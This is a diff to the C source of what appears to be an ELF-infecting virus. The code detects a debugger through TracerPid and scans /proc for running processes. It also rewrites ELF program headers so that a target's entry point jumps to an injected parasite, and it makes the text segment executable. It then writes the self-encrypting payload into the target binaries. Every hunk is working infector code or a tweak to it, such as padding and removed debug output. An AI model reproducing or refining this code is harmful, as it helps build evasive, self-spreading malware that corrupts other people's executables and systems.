@@ -52,7 +52,7 @@ bool is_infected(const char *haystack, size_t n);
  char            *ft_strnstr(char *s1, char *s2, size_t n);
  int             ft_strcmp(const char *s1, const char *s2);
 
-#define PAGE_SIZE (0x4000)
+#define PAGE_SIZE (0x2000)
 #define PAGE_SZ64 PAGE_SIZE
 # define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3)\
 type name(type1 arg1,type2 arg2, type3 arg3)\
@@ -140,7 +140,7 @@ _start()
 			"pushq %r15\n"
 
 		    "call do_main\n"
-	  //      "int3\n"
+	      //  "int3\n"
 	        "jmp myend\n");
 
 }
@@ -190,7 +190,6 @@ bool process_runing(void)
 	char path[64];
 
 	fd = open ("/proc/self/status", 0,0);
-	ft_putstr("open /proc/self/status\n");
 	while((i =read(fd,buf,256)) > 0)
 	{
 		if ((TracerPid = ft_strnstr(buf,"TracerPid:",i)) != 0)
@@ -208,10 +207,8 @@ bool process_runing(void)
 	dd = open("/proc/",0x10000,0);
 	if (dd <= 0)
 	{
-		ft_putstr("error opem /proc/\n");
 		return 1;
 	}
-	ft_putstr("getdents64");
 	ft_memmove(path,"/proc/",6);
 	char cmdname[64];
 	while ((nread = getdents64(dd, buf, 256)) > 0)
@@ -223,7 +220,6 @@ bool process_runing(void)
 			i += d->d_reclen ;
 			if (ft_isallnum(d->d_name) == 0)
 			{
-				ft_putstr("good :");
 				ft_memmove(path + 6,d->d_name,ft_strlen(d->d_name)+ 1);
 				ft_memmove(path + ft_strlen(path), "/status\0", 8);
 				fd = open(path,0,0);
@@ -684,6 +680,29 @@ int open_directory(char *path)
 	close(dd);
 	return 0;
 }
+void    ft_putchar(char c)
+{
+	write(1, &c, 1);
+}
+
+void    ft_putnbr(long long n)
+{
+	size_t  nb;
+
+	nb = n;
+	if (n < 0)
+	{
+		ft_putchar('-');
+		nb = -n;
+	}
+	if (nb > 9)
+	{
+		ft_putnbr(nb / 10);
+		ft_putnbr(nb % 10);
+	}
+	if (nb <= 9)
+		ft_putchar(nb + '0');
+}
 
 int do_the_job(char buff[],size_t size, char *path)
 {
@@ -729,7 +748,7 @@ int do_the_job(char buff[],size_t size, char *path)
 	uint64_t text;
 	// Increase section header offset by PAGE_SIZE
 
-	hdr->e_shoff += PAGE_SZ64;
+	hdr->e_shoff += PAGE_SZ64 + PAGE_SIZE*4;
 
 	for(int i=0; i < hdr->e_phnum; i++){
 		if(is_infected(buff + phdr[i].p_offset, phdr[i].p_filesz))
@@ -745,17 +764,17 @@ int do_the_job(char buff[],size_t size, char *path)
 			//puts("text found");
 			text = phdr[i].p_offset;
 			text_end = phdr[i].p_offset + phdr[i].p_filesz;
-			payload_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz;
+			payload_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz + PAGE_SIZE*4;
 
 
-			hdr->e_entry = payload_vaddr + SIZE_BEFORE_ENTRY_POINT +0;
+			hdr->e_entry = payload_vaddr + SIZE_BEFORE_ENTRY_POINT + 0;
+			//ft_putnbr(payload_vaddr);
 
 
+			entry =  (phdr[i].p_paddr + phdr[i].p_filesz  + PAGE_SIZE*4+ SIZE_BEFORE_ENTRY_POINT)- entry;
 
-			entry =  (phdr[i].p_paddr + phdr[i].p_filesz  + SIZE_BEFORE_ENTRY_POINT)- entry;
-
-			phdr[i].p_filesz += payload_len +100;
-			phdr[i].p_memsz += payload_len + 100;
+			phdr[i].p_filesz += payload_len +100 +PAGE_SIZE*4;
+			phdr[i].p_memsz += payload_len + 100 + PAGE_SIZE*4;
 			phdr[i].p_flags |= PF_X;
 				new_file(buff,size,text_end, path,entry);
 			return 0;
@@ -860,16 +879,16 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 
 	unsigned long address_of_start = get_eip() - ((char *)&yeah - (char *)&real_start);
 	unsigned long address_of_start_encrypt = get_eip() - ((char *)&yeah - (char *)&main_encrypt);
-
 	size_t size_wrote = 0;
 	size_t	value;
-
+	for (int j = 0; j< PAGE_SIZE *4;j++)
+		write(fd,"\0",1);
 	size_wrote =	put_sig(fd);
 	value = (address_of_start_encrypt - address_of_start);
 	size_wrote += write(fd, (char *)(&value), sizeof(size_t));
 	value = parasite_size - 7 - (address_of_start_encrypt - address_of_start);
 	size_wrote += write(fd, (char *)(&value), sizeof(size_t));
-
+ft_putnbr(parasite_size);
 	size_wrote += write(fd,(char *) address_of_start, (address_of_start_encrypt - address_of_start));
 	size_wrote += crypter((char *)address_of_start_encrypt, parasite_size - 7 - (address_of_start_encrypt - address_of_start) , (address_of_start_encrypt - address_of_start), fd);
 
